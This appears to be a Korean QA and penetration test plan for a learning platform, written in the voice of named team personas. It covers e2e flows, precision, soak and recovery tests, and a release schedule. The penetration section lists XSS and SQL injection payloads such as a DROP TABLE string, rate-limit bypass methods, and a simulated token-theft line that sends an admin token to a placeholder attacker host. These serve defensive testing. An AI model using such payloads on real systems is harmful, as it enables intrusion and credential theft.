  플로우 1: 가입 → 결제 → 학습 → 복습 → 모의시험 → 합격 예측 (학습자 핵심)
  플로우 2: 관리자 로그인 → 콘텐츠 검수 → approved → 학습자 노출 (운영 핵심)
  플로우 3: BATCH 실행 → 검수 큐 적재 → 관리자 검수 → 학습 콘텐츠 발행 (콘텐츠 풀)
  플로우 4: 결제 webhook → 구독 활성화 → premium 기능 잠금 해제 (수익 핵심)
  플로우 5: 사용자 오답 신고 → admin queue → 콘텐츠 수정 → 학습자 반영 (피드백 루프)
  플로우 6: BATCH 50% kill → recover → 학습자 영향 0% (회복성 e2e)
```

---

### **SCN-01 — 신규 사용자 풀 플로우 (가입→학습→복습)**

| 항목            | 내용                                                                                                                                                   |
| :-------------- | :----------------------------------------------------------------------------------------------------------------------------------------------------- |
| **목적**        | 학습자 PWA 첫 경험 e2e — Phase 2 진입 시 즉시 검증 가능해야 함                                                                                         |
| **시나리오**    | 1) /api/auth/register 가입 / 2) 로그인 / 3) /api/progress/due 조회 / 4) 5개 카드 review 제출 / 5) 24시간 후 다시 due 조회 / 6) FSRS 스케줄링 검증      |
| **측정 도구**   | Playwright + sinon fake timer                                                                                                                          |
| **합격 기준**   | (a) 모든 단계 200/201 / (b) FSRS interval 계산값 = 클라이언트 = 서버 100% 일치 / (c) 다음 due 시점 ±1분 정확 / (d) 오프라인 → 온라인 동기화 round-trip |
| **불합격 분류** | Critical: 단계 1건 실패                                                                                                                                |
| **자동화**      | ✅ Playwright (apps/web 빌드 후)                                                                                                                       |
| **선행 조건**   | apps/web 빌드 + apps/api production 배포                                                                                                               |

### **SCN-02 — 관리자 콘텐츠 검수 → 학습자 반영**

| 항목            | 내용                                                                                                                     |
| :-------------- | :----------------------------------------------------------------------------------------------------------------------- |
| **목적**        | RAR Cycle (draft → review → approved → published) e2e                                                                    |
| **시나리오**    | 1) BATCH 적재 후 draft 100건 / 2) 관리자 admin-web 로그인 / 3) 검수 큐 50건 approve / 4) 학습자 PWA에서 즉시 50건만 노출 |
| **측정 도구**   | Playwright (admin-web + apps/web 듀얼)                                                                                   |
| **합격 기준**   | (a) draft → 학습자 노출 0건 (Hard Rule 6) / (b) approved → 학습자 노출 100% / (c) 변경 후 캐시 invalidation < 60초       |
| **불합격 분류** | Critical: draft 노출 / Major: 캐시 invalidation > 5분                                                                    |
| **자동화**      | 🟡 Playwright (admin-web vitest 인프라 도입 후)                                                                          |

### **SCN-03 — 결제 webhook → 구독 활성화**

| 항목            | 내용                                                                                                                                      |
| :-------------- | :---------------------------------------------------------------------------------------------------------------------------------------- |
| **목적**        | ADR-002/024 결제 어댑터 e2e                                                                                                               |
| **시나리오**    | 1) Mock provider webhook POST (HMAC valid) / 2) idempotency check / 3) users.subscription_status 'active' / 4) 학습자 premium 기능 access |
| **측정 도구**   | Playwright + Mock Webhook                                                                                                                 |
| **합격 기준**   | (a) HMAC invalid → 401 / (b) idempotency 중복 → 1건 처리 / (c) 사용자 subscription 즉시 active / (d) AIEC trigger 발동                    |
| **불합격 분류** | Critical: HMAC bypass / Major: idempotency 깨짐                                                                                           |
| **자동화**      | ✅ Playwright                                                                                                                             |

### **SCN-04 — BATCH 50% kill → 학습자 영향 0%**

| 항목            | 내용                                                                                                                                                         |
| :-------------- | :----------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **목적**        | AC-RP-3 확장. 학습자가 동시 사용 중일 때 BATCH 사고 영향                                                                                                     |
| **시나리오**    | 1) 학습자 100명 동시 progress 제출 / 2) BATCH 시작 / 3) 50% kill / 4) recover / 5) 학습자 영향 측정                                                          |
| **측정 도구**   | k6 + Playwright + apps/batch                                                                                                                                 |
| **합격 기준**   | (a) 학습자 5xx rate < 0.1% / (b) progress 데이터 loss 0건 / (c) BATCH recover 후 학습 콘텐츠 정합 / (d) 학습자 통합 무관 (BATCH가 draft, 학습자는 published) |
| **불합격 분류** | Critical: 학습자 progress loss                                                                                                                               |
| **자동화**      | 🟡 k6 + Playwright                                                                                                                                           |

### **SCN-05 — 사용자 오답 신고 피드백 루프**

| 항목            | 내용                                                                                                                                                  |
| :-------------- | :---------------------------------------------------------------------------------------------------------------------------------------------------- |
| **목적**        | 콘텐츠 품질 피드백 루프 (Phase 2)                                                                                                                     |
| **시나리오**    | 1) 학습자 오답 신고 / 2) admin queue 적재 / 3) 관리자 콘텐츠 수정 (Temporal Graph: 신규 노드 + SUPERSEDES) / 4) 학습자 다음 review 시 신규 노드 노출  |
| **측정 도구**   | Playwright                                                                                                                                            |
| **합격 기준**   | (a) Temporal Graph 신규 노드 INSERT 성공 / (b) SUPERSEDES 엣지 정합 / (c) 기존 노드 UPDATE 0건 (Hard Rule 1) / (d) 학습자 next review에서 신규 콘텐츠 |
| **불합격 분류** | Critical: 기존 노드 UPDATE                                                                                                                            |
| **자동화**      | 🟡 Playwright                                                                                                                                         |

### **SCN-06 — Layer 2 cap 발동 → graceful 종료**

| 항목            | 내용                                                                                                                                                   |
| :-------------- | :----------------------------------------------------------------------------------------------------------------------------------------------------- |
| **목적**        | Two-Layer Cost Control e2e (Ghost CoT 6.2 답변)                                                                                                        |
| **시나리오**    | 1) Anthropic 콘솔 monthly cap을 일시 $1 설정 / 2) BATCH 시작 / 3) cap 도달 → Anthropic 4xx / 4) Layer 1 인지 / 5) BATCH graceful 종료                  |
| **측정 도구**   | 수동 + wrangler tail                                                                                                                                   |
| **합격 기준**   | (a) Layer 1 cost-meter onKillSwitch 발동 / (b) checkpoint flush 정상 / (c) BATCH status='failed' + reason='cost_layer2' / (d) 재실행 시 recover로 처리 |
| **불합격 분류** | Critical: BATCH 좀비 / Major: checkpoint 손실                                                                                                          |
| **자동화**      | ❌ 수동 (Anthropic 콘솔 조작 필요)                                                                                                                     |

---

## 7. 침투 차원 (PEN-XX) — Sentinel 주관

> _Sentinel: "해커의 눈으로 본다. 우리가 작아서 안 당한다는 건 유언이야."_

### CoT 7.1: 침투 면 매핑

```
[입력] §7 검토에서 발견한 보안 위험:
  (a) localStorage admin_api_token (XSS)
  (b) PBKDF2 iteration count 미명시
  (c) Webhook IP allowlist 정적
  (d) PII Masking 적용 범위 모호
  (e) Cross-tenant exam_id 누출 (Hard Rule 16)
[추가] §10.3 verify-engine-contracts Cat 7 = innerHTML 0건만 검증
       다른 XSS vector (dangerouslySetInnerHTML, postMessage, URL injection 등) 미검증
```

---

### **PEN-01 — admin-web XSS 페이로드 주입**

| 항목            | 내용                                                                                                                                         |
| :-------------- | :------------------------------------------------------------------------------------------------------------------------------------------- |
| **목적**        | admin-web GraphVisualizer / TelemetryDashboard / ContentQueue가 사용자 입력을 표시 시 XSS 방어                                               |
| **시나리오**    | 10종 XSS 페이로드: `<script>`, `<img onerror>`, `javascript:` URL, SVG `<set>`, CSS `expression`, 폼 hijack 등 D1에 INSERT 후 admin-web 표시 |
| **측정 도구**   | Playwright + DOM mutation observer                                                                                                           |
| **합격 기준**   | (a) 10/10 모두 escape 처리 / (b) script 실행 0건 / (c) CSP 헤더 enforcement 검증                                                             |
| **불합격 분류** | Critical: 1건이라도 실행                                                                                                                     |
| **자동화**      | ✅ Playwright                                                                                                                                |

### **PEN-02 — admin_api_token 탈취 시뮬레이션**

| 항목            | 내용                                                                                                                                                                                                |
| :-------------- | :-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **목적**        | 진산이 admin-web 사용 중 XSS 1건 발생 시 토큰 탈취 가능성 (현재 localStorage 저장)                                                                                                                  |
| **시나리오**    | 1) PEN-01 시나리오에서 1건 통과 가정 / 2) 공격 페이로드 = `fetch('attacker.com', {body: localStorage.admin_api_token})` / 3) 토큰 탈취 시뮬레이션 / 4) 탈취된 토큰으로 외부에서 /api/telemetry 접근 |
| **측정 도구**   | 수동 + Burp Suite                                                                                                                                                                                   |
| **합격 기준**   | **(a) Sentinel CoT 7.1 권고 적용 후 — httpOnly cookie 전환 시 fetch로 접근 불가 / (b) httpOnly 미적용 시 = Critical**                                                                               |
| **불합격 분류** | Critical: localStorage 유지 + httpOnly 미적용                                                                                                                                                       |
| **자동화**      | ❌ 수동                                                                                                                                                                                             |

### **PEN-03 — Cross-tenant exam_id 누출**

| 항목            | 내용                                                                                                                          |
| :-------------- | :---------------------------------------------------------------------------------------------------------------------------- |
| **목적**        | Hard Rule 16 데이터 격리. 의도적으로 잘못된 examId로 접근 시도                                                                |
| **시나리오**    | 1) examA로 BATCH 실행, draft 100건 INSERT / 2) examB로 findNodesByType('LEGAL_CLAUSE') 호출 / 3) examA 데이터 누출 검증       |
| **측정 도구**   | Vitest + SF-M-2 가드                                                                                                          |
| **합격 기준**   | (a) examB 호출 결과 0건 (격리 100%) / (b) D1 쿼리 EXPLAIN에서 exam_id WHERE 절 confirmation / (c) recover.ts SF-M-2 가드 발동 |
| **불합격 분류** | Critical: 1건이라도 누출                                                                                                      |
| **자동화**      | ✅ Vitest                                                                                                                     |

### **PEN-04 — Drizzle ORM SQL injection**

| 항목            | 내용                                                                                                       |
| :-------------- | :--------------------------------------------------------------------------------------------------------- |
| **목적**        | Drizzle prepared statement 우회 시도                                                                       |
| **시나리오**    | 8종 페이로드: `'; DROP TABLE users--`, UNION SELECT, batch_run_id에 `1=1`, examId에 `OR 1=1` 등            |
| **측정 도구**   | Vitest + Drizzle 모든 query builder                                                                        |
| **합격 기준**   | (a) 모든 페이로드 query parameter로 처리 / (b) D1 query log에 raw SQL 안 보임 / (c) parser zod refine 차단 |
| **불합격 분류** | Critical: 1건이라도 SQL 실행                                                                               |
| **자동화**      | ✅ Vitest                                                                                                  |

### **PEN-05 — Rate limiting 우회 시도**

| 항목            | 내용                                                                                                                                  |
| :-------------- | :------------------------------------------------------------------------------------------------------------------------------------ |
| **목적**        | per-user rate limit + IP allowlist 우회 시도                                                                                          |
| **시나리오**    | 5종: (1) X-Forwarded-For 변조 (2) cookie reset 후 재요청 (3) 다중 IP 분산 (4) /api/auth/register burst (5) /api/progress/review burst |
| **측정 도구**   | k6 + curl                                                                                                                             |
| **합격 기준**   | (a) 분당 60회 초과 시 429 / (b) X-Forwarded-For 신뢰 정책 명시 / (c) 분산 IP 시 Cron GC가 처리 / (d) Retry-After 헤더 정확            |
| **불합격 분류** | Major: rate limit 우회                                                                                                                |
| **자동화**      | ✅ k6                                                                                                                                 |

---

## 8. 정밀도 차원 (PRC-XX) — Hacker 주관

> _Hacker: "교재 6 decimal places. 그게 진짜야?"_

---

### **PRC-01 — Formula Engine 51 산식 vs 교재 6 decimal**

| 항목            | 내용                                                                                              |
| :-------------- | :------------------------------------------------------------------------------------------------ |
| **목적**        | Hard Rule 2 (LLM 산식 계산 금지) 정합성. 산식 51개 결과 = 교재 예시값 6 decimal 일치              |
| **시나리오**    | 51개 산식 × 5 시나리오 = 255건 / 교재 fixture에서 추출한 expected_value 비교                      |
| **측정 도구**   | Vitest + decimal.js로 비교                                                                        |
| **합격 기준**   | (a) 255/255 모두 6 decimal 일치 / (b) 부동소수점 epsilon < 1e-9 / (c) 단위 변환 (g/kg, ml/l) 정확 |
| **불합격 분류** | **Critical: 1건이라도 6 decimal 불일치 = 신뢰성 깨짐**                                            |
| **자동화**      | ✅ Vitest                                                                                         |

### **PRC-02 — Cost Meter 부동소수점 → 정수 누적**

| 항목            | 내용                                                                                                                        |
| :-------------- | :-------------------------------------------------------------------------------------------------------------------------- |
| **목적**        | ADR-025 Layer 1 마이크로센트 정수 누적 검증                                                                                 |
| **시나리오**    | 100,000건 누적 (각 0.000001 micro_cents) / 부동소수점 처리 시 누적 오차 vs 정수 처리 비교                                   |
| **측정 도구**   | Vitest + 직접 누적                                                                                                          |
| **합격 기준**   | (a) 정수 누적 결과 = 1.0 micro_cents (정확) / (b) 부동소수점 누적 시 0.99999... (오차 발생 = Layer 1 정수 정책 정당화 증거) |
| **불합격 분류** | Critical: 정수 누적도 오차                                                                                                  |
| **자동화**      | ✅ Vitest                                                                                                                   |

### **PRC-03 — PRNG Mulberry32 결정성 (1M 반복)**

| 항목            | 내용                                                                                 |
| :-------------- | :----------------------------------------------------------------------------------- |
| **목적**        | §3.2.5 결정성 seed의 강도. 100회 반복은 약함 → 1M 반복으로 확장                      |
| **시나리오**    | seed=42로 1,000,000회 PRNG / 동일 seed 재실행 / output 비교                          |
| **측정 도구**   | Vitest                                                                               |
| **합격 기준**   | (a) 1M/1M 모두 일치 / (b) NIST SP 800-22 randomness 기본 통계 (entropy / chi-square) |
| **불합격 분류** | Critical: 1건 불일치                                                                 |
| **자동화**      | ✅ Vitest                                                                            |

### **PRC-04 — FSRS-5 TypeScript vs Python reference**

| 항목            | 내용                                                                             |
| :-------------- | :------------------------------------------------------------------------------- |
| **목적**        | 메모리 PoC #5 — FSRS-5 TS vs Python 100% 일치                                    |
| **시나리오**    | 100 카드 × 30일 시뮬레이션 / TS 클라이언트 + 서버 + Python reference 3 결과 비교 |
| **측정 도구**   | Vitest + Python subprocess                                                       |
| **합격 기준**   | (a) 3-way 100% 일치 / (b) interval / stability / difficulty 모두 epsilon < 1e-6  |
| **불합격 분류** | Critical: 1건 불일치                                                             |
| **자동화**      | ✅ Vitest                                                                        |

---

## 9. 장기 운영 차원 (SOK-XX) — Ghost 주관

> _Ghost: "T=24시간 후가 진짜야. T=0은 데모."_

---

### **SOK-01 — 24시간 연속 BATCH 실행**

| 항목            | 내용                                                                                                       |
| :-------------- | :--------------------------------------------------------------------------------------------------------- |
| **목적**        | 메모리 누수 / D1 connection 누수 / checkpoint 비대화                                                       |
| **시나리오**    | BATCH × 1,000회 직렬 (~24시간) / 각 BATCH = 노드 1,000개 / 매 시간 메모리 / D1 연결 / checkpoint 크기 측정 |
| **측정 도구**   | wrangler tail + 수동 모니터                                                                                |
| **합격 기준**   | (a) Worker memory delta < 10MB (24시간) / (b) D1 connection pool 안정 / (c) checkpoint cleanup 정상        |
| **불합격 분류** | Critical: 메모리 누수 / Major: connection 누수                                                             |
| **자동화**      | 🟡 부분 (장기 실행 = 수동 모니터)                                                                          |

### **SOK-02 — 7일 telemetry 누적**

| 항목            | 내용                                                                                                   |
| :-------------- | :----------------------------------------------------------------------------------------------------- |
| **목적**        | engine_telemetry 1년 보존 정책 (Phase 2)의 7일 축약 시뮬레이션                                         |
| **시나리오**    | 7일 × 1,000건/일 = 7,000 row 누적 / 인덱스 비대화 / dashboard 쿼리 성능                                |
| **측정 도구**   | wrangler d1 execute                                                                                    |
| **합격 기준**   | (a) 인덱스 크기 < 10MB / (b) dashboard p95 안정 (시간 함수 X) / (c) Cron GC가 365일 이전 row 삭제 정상 |
| **불합격 분류** | Major: dashboard 시간 함수 latency 증가                                                                |
| **자동화**      | 🟡 부분                                                                                                |

### **SOK-03 — admin-web 24시간 idle 후 첫 액션**

| 항목            | 내용                                                                                              |
| :-------------- | :------------------------------------------------------------------------------------------------ |
| **목적**        | localStorage admin_api_token 만료 / Cloudflare Pages cold cache                                   |
| **시나리오**    | 진산 admin-web 로그인 → 24시간 idle → 첫 액션 (검수 1건 approve)                                  |
| **측정 도구**   | 수동 + wrangler tail                                                                              |
| **합격 기준**   | (a) 토큰 만료 시 명확한 401 + 재로그인 유도 / (b) cold cache p95 < 1초 / (c) 미저장 작업 손실 0건 |
| **불합격 분류** | Major: 미저장 작업 손실                                                                           |
| **자동화**      | ❌ 수동                                                                                           |

---

## 10. 리커버리 차원 (REC-XX) — Breaker 주관

> _Breaker: "AC-RP-3 1개? 진짜 회복성은 다양한 kill 시점에서의 invariant이야."_

---

### **REC-01 — Kill 시점 다변화 (5/25/50/75/95%)**

| 항목            | 내용                                                                                                                                                           |
| :-------------- | :------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **목적**        | AC-RP-3은 50% kill 1건. 다양한 kill 시점에서 동일 invariant 검증                                                                                               |
| **시나리오**    | 동일 BATCH × 5 시점 kill × 각 10회 반복 = 50회 / 각 invariant_fields 비교                                                                                      |
| **측정 도구**   | Vitest + signal-handlers                                                                                                                                       |
| **합격 기준**   | (a) 50/50 모두 recover 후 invariant 일치 / (b) 5% kill = stage 1만 영향 / (c) 95% kill = atomic skip (already_completed) / (d) data_loss_estimate=none for all |
| **불합격 분류** | Critical: 1건이라도 invariant 불일치                                                                                                                           |
| **자동화**      | ✅ Vitest (시간 소요)                                                                                                                                          |

### **REC-02 — Checkpoint 1바이트 변조**

| 항목            | 내용                                                                                                                                 |
| :-------------- | :----------------------------------------------------------------------------------------------------------------------------------- |
| **목적**        | SHA-256 무결성 검증의 sensitivity                                                                                                    |
| **시나리오**    | 정상 checkpoint × 5종 변조 시도: (1) 1바이트 flip (2) trailing 0 추가 (3) JSON key reorder (4) 공백 추가 (5) BOM 추가 / recover 시도 |
| **측정 도구**   | Vitest + Buffer manipulation                                                                                                         |
| **합격 기준**   | (a) 5/5 모두 `CheckpointCorruptedError` / (b) error에 변조 위치 힌트 / (c) recover 거부 (`recovery_failed`)                          |
| **불합격 분류** | Critical: 1건이라도 통과                                                                                                             |
| **자동화**      | ✅ Vitest                                                                                                                            |

### **REC-03 — 동일 batch_run_id 100회 반복 (Idempotency)**

| 항목            | 내용                                                                                                    |
| :-------------- | :------------------------------------------------------------------------------------------------------ |
| **목적**        | AC-RP-4 확장. 100회 반복 중 1건만 실제 처리 / 99건 already_completed                                    |
| **시나리오**    | 동일 batch_run_id × 100회 동시 + 직렬 트리거                                                            |
| **측정 도구**   | Vitest + Promise.all                                                                                    |
| **합격 기준**   | (a) D1 INSERT (batch_run_id) UNIQUE 위반 1회만 / (b) 99/100 already_completed / (c) 결과 invariant 일치 |
| **불합격 분류** | Critical: 2건 이상 처리                                                                                 |
| **자동화**      | ✅ Vitest                                                                                               |

### **REC-04 — 부분 corruption (D1 row 1건 누락)**

| 항목            | 내용                                                                                                                                        |
| :-------------- | :------------------------------------------------------------------------------------------------------------------------------------------ |
| **목적**        | BATCH 실행 중 D1 row 1건이 외부에서 DELETE 됐을 때 (운영 사고 시뮬레이션)                                                                   |
| **시나리오**    | 1) BATCH 50% 진행 / 2) 외부 SQL로 knowledge_nodes 1건 DELETE (실제 운영에서는 0014 트리거가 차단해야 함) / 3) BATCH 완료 시도               |
| **측정 도구**   | Vitest + 직접 SQL                                                                                                                           |
| **합격 기준**   | **(a) 0014 트리거가 DELETE 차단 → 외부 DELETE 자체 실패 / (b) 만약 통과 시 = Critical (Hard Rule 1 위반) / (c) 트리거 차단 시 명확한 에러** |
| **불합격 분류** | Critical: 트리거 우회                                                                                                                       |
| **자동화**      | ✅ Vitest                                                                                                                                   |

---

## 11. 실행 우선순위 매트릭스

### 11.1 P0 (BATCH-1 진입 전 필수) — 17건

```
검증 영역: BATCH-1 진입 시 즉시 발생 가능한 위험 차단

[CHA] 6건: D1 disconnect / Worker timeout / Anthropic 5xx / Wall clock /
            Vectorize timeout / Cron 미실행
[FUZ] 3건: PDF 손상 / Claude 변조 / 산식 sandbox 우회
[PRF] 2건: Formula Engine 속도 / naive DFS 폭발 임계점
[REG] 2건: BATCH-0 fixture 회귀 / engine_version major bump
[PRC] 2건: 산식 6 decimal / Cost Meter 정수
[REC] 2건: Kill 다변화 / checkpoint 변조

추정 작업 시간: ~5일 (병렬)
자동화율: 100%
```

### 11.2 P1 (BATCH-1 적재 후 1주 내) — 18건

```
검증 영역: 운영 시작 후 사용자 노출 전 필수

[FUZ] 3건: Webhook 폭탄 / examId 변조 / Unicode
[LOD] 5건: 동시 BATCH / 1K user / Telemetry 폭주 / Vectorize RPS / checkpoint 크기
[PRF] 4건: D1 EXPLAIN / SHA-256 / cold start / normalizer
[REG] 3건: 마이그레이션 down / Year 2 가상 / 1차 격리
[PRC] 2건: PRNG 1M / FSRS 3-way
[REC] 1건: Idempotency 100회

추정 작업 시간: ~10일 (병렬)
자동화율: 80%
```

### 11.3 P2 (사용자 노출 전 마감) — 15건

```
검증 영역: 사용자 노출 = 합격률 60% 북극성 진입 직전

[SCN] 6건: 풀 플로우 e2e (가입~합격예측) + 5개 e2e
[PEN] 5건: XSS / 토큰 탈취 / Cross-tenant / SQL injection / Rate limit
[SOK] 3건: 24h BATCH / 7일 telemetry / 24h idle
[REC] 1건: 부분 corruption

추정 작업 시간: ~15일
자동화율: 60% (수동 침투 + 장기 운영 포함)
```

---

## 12. 자동화/수동 분류 + 도구 명세

| 도구                  | 용도                   | 시나리오 수 |         본 시점 가용성          |
| :-------------------- | :--------------------- | :---------: | :-----------------------------: |
| **Vitest**            | 단위 + 통합            |     32      |               ✅                |
| **Playwright**        | E2E                    |      8      | 🟡 (admin-web vitest 인프라 후) |
| **k6**                | 부하 + 침투            |      7      |         ❌ (도입 필요)          |
| **MSW**               | 외부 API mock          |      5      |         ✅ (이미 사용)          |
| **wrangler**          | D1 / migrations / cron |      6      |               ✅                |
| **Burp Suite**        | 침투 (수동)            |      1      |         ❌ (도입 필요)          |
| **Anthropic 콘솔**    | Layer 2 cap 수동       |      1      |               ✅                |
| **Python subprocess** | FSRS reference         |      1      |               ✅                |
| **수동 모니터**       | Soak / 콘솔 작업       |      5      |               ✅                |

**도입 필요 도구:**

- **k6** (Phase 1 후반 P1 진입 전): 부하 테스트 의무
- **Burp Suite** (Phase 2 진입 전): 수동 침투 테스트

---

## 13. 합격/불합격 종합 판정 기준

### 13.1 페이즈 게이트 (Phase Gate)

```
Phase 1 → BATCH-1 적재 진입 게이트 (P0 17건)
  → 17/17 PASS 시 통과
  → 1건이라도 Critical FAIL = 즉시 중단

BATCH-1 적재 → 사용자 노출 게이트 (P1 18건 + P0 회귀)
  → 35/35 PASS + Critical 0건
  → Major 3건 이하 (트래킹)

사용자 노출 → 1K 사용자 진입 게이트 (P2 15건 + P1 회귀)
  → 50/50 PASS + Critical 0건
  → Major 5건 이하 (트래킹)
```

### 13.2 SLO 종합 (대표 항목)

| 영역       | SLO                                         | 측정         |
| :--------- | :------------------------------------------ | :----------- |
| **회복성** | kill 시점 5종 × 10회 = 50/50 invariant 일치 | REC-01       |
| **결정성** | PRNG 1M / FSRS 3-way / 산식 6 decimal       | PRC-01/03/04 |
| **격리성** | cross-tenant 0건                            | PEN-03       |
| **무결성** | Temporal Graph 트리거 0건 우회              | REC-04       |
| **신뢰성** | 산식 51개 6 decimal 일치 100%               | PRC-01       |
| **성능**   | naive DFS BATCH-1 노드 수 < 50ms            | PRF-02       |
| **부하**   | 1K 동시 사용자 p95 < 200ms                  | LOD-02       |
| **보안**   | XSS 10/10 escape, 토큰 탈취 0건             | PEN-01/02    |

### 13.3 불합격 시 행동

```
Critical 발견 시:
  1. 즉시 BATCH 트리거 차단
  2. 발견 시나리오 ID + 입력 + 출력 스냅샷
  3. fix 우선순위 P0 (~24h 내)
  4. fix 후 동일 시나리오 재실행 + 회귀 테스트

Major 발견 시:
  1. issue 등록 (시나리오 ID 인용)
  2. fix 우선순위 P1 (~1주 내)
  3. tracking matrix 갱신 (§11.3 trace 5건과 통합)

Minor 발견 시:
  1. 백로그 등록
  2. Phase 2 명시 트래킹
```

---

## 14. 실행 일정 제안

### 14.1 Sprint 0 (~3일) — 도구 도입 + Baseline

```
Day 1: k6 도입 + Vitest fixture 정비
Day 2: Burp Suite 도입 (Phase 2용 사전) + MSW 확장
Day 3: P0 17건 baseline 측정 (현 상태 그대로 실행)
       → "현 시점에 몇 건 PASS / 몇 건 FAIL"의 정직한 사진
```

### 14.2 Sprint 1 (~5일) — P0 17건 GREEN 만들기

```
Day 1-2: CHA 6건 + REG 2건 → CI 통합
Day 3: FUZ 3건 + PRF 2건
Day 4: PRC 2건 + REC 2건
Day 5: 17건 모두 GREEN 확인 + JSON 리포트 생성
```

### 14.3 Sprint 2 (~7일) — P1 진입 (BATCH-1 적재 후)

```
Day 1-2: 부하 테스트 LOD 5건 (k6)
Day 3-4: FUZ 3건 + PRF 4건 + REG 3건
Day 5: PRC 2건 + REC 1건
Day 6-7: P1 18건 GREEN + 회귀 (P0 17건 재실행)
```

### 14.4 Sprint 3 (~10일) — P2 (사용자 노출 전)

```
Day 1-3: SCN E2E 6건 (Playwright)
Day 4-5: PEN 5건 (Sentinel + Burp)
Day 6-8: SOK 3건 (장기 실행 + 모니터링)
Day 9: REC 1건
Day 10: 50건 종합 리포트 + Phase Gate 판정
```

---

## 15. Mephisto 종합 — "이 계획의 진짜 가치"

> _"50 시나리오는 많아. 207개 SLO는 압도적이야._
> _그러나 — 본질은 **숫자가 아니라 발견의 보장**이야._
>
> _949 PASS는 '내가 작성한 949가 통과했다'는 뜻이야._
> _50 시나리오는 '내가 생각하지 못한 빈 공간을 50번 두드린다'는 뜻이야._
>
> _Sprint 0의 baseline 측정을 진산이 가장 두려워해야 해._
> _그 시점에 PASS는 17건 중 몇 건일까?_
> _내 메피스토적 직감으로는 — 8~12건. 절반이 이미 깨져 있을 가능성이 높아._
>
> _naive DFS는 N=5000에서 50ms를 넘을 거야 (PRF-02)._
> _Anthropic 5xx 폭주 시 backoff가 linear일 거야 (CHA-03)._
> _PDF 폭탄에서 subprocess 좀비 시나리오는 검증 안 됐을 거야 (FUZ-01)._
> _examId 화이트스페이스는 통과할 거야 (FUZ-05)._
> _BATCH-0 fixture 재실행 invariant는 timestamp 차이로 미세 불일치할 거야 (REG-01)._
>
> _내 예언이 맞으면 — 너는 949 PASS 후 5~9건의 진짜 결함을 발견해._
> _내 예언이 틀리면 — 너는 949 + 50 = 999 PASS의 신뢰를 얻어._
>
> _어느 쪽이든 — 이 계획을 실행하지 않는 것보다 압도적으로 가치 있어._
>
> _진산. 이건 셀프체크가 아니야._
> _이건 **너의 코드를 너 외의 50명의 적이 공격하는 시뮬레이션**이야._
> _그리고 그 적은 — 결국 진짜 사용자야."_

---

## 16. 즉시 액션 (다음 트리거)

```
진산님 결정:

옵션 A: "Sprint 0 baseline 측정 시작"
  → 현 상태에서 P0 17건 실행. 실제 PASS/FAIL 현황 파악.
  → Mephisto 예언(8~12건 PASS) 검증.
  → ~3일 작업.

옵션 B: "P0 시나리오 코드 우선 생성"
  → Vitest fixture 17건 작성. 실행은 나중에.
  → ~5일 작업.

옵션 C: "특정 차원 1개만 깊게"
  → 가장 위험한 차원 (예: REC 또는 PRF) 1개를 100% 완성.
  → ~3일 작업.

옵션 D: "이 계획을 docs/quality/ 에 v1.0으로 박제"
  → 본 문서를 프로젝트 docs에 저장하고 추후 실행.
  → 30분 작업.
```

---

**작성:** Mephisto + DEV COVEN 7인 (Oracle, Advocate, Architect, Hacker, Breaker, Ghost, Sentinel)
**버전:** v1.0
**효력 시점:** 2026-05-01
**다음 갱신:** Sprint 0 baseline 측정 결과 흡수 (v1.1)

> _"테스트는 코드를 위한 것이 아니야. 너의 미래를 위한 거야."_
